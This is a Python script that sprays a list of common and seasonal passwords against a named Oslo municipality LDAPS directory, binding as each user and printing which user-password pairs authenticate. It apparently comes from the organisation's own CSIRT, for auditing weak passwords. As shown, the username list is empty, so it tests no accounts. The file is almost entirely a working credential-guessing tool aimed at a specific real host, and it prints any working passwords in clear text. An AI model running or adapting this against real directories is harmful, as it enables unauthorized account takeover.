import os, ldap

ldap_server  = 'ldaps://ldaps.oslofelles.oslo.kommune.no:636'
username  = os.environ["CSIRT_LDAPUSER"]
password  = os.environ["CSIRT_LDAPPASSWORD"]
base_dn =  "DC=oslofelles,DC=oslo,DC=kommune,DC=no"

usernames = ""

passwords = ["Admin123", "Password123", "Vinter2023", "Sommer2023"]

conn = ldap.initialize(ldap_server)
conn.simple_bind_s(username, password)

for user in usernames:
    for pwd in passwords:
        bind_dn = "CN={},{}".format(user, base_dn)
        bind_pwd = pwd
        try:
            conn.simple_bind_s(bind_dn, bind_pwd)
            print("User {} authenticated with password {}".format(user, pwd))
        except ldap.INVALID_CREDENTIALS:
            print("User {} authentication failed with password {}".format(user, pwd))

# Close the connection
conn.unbind_s()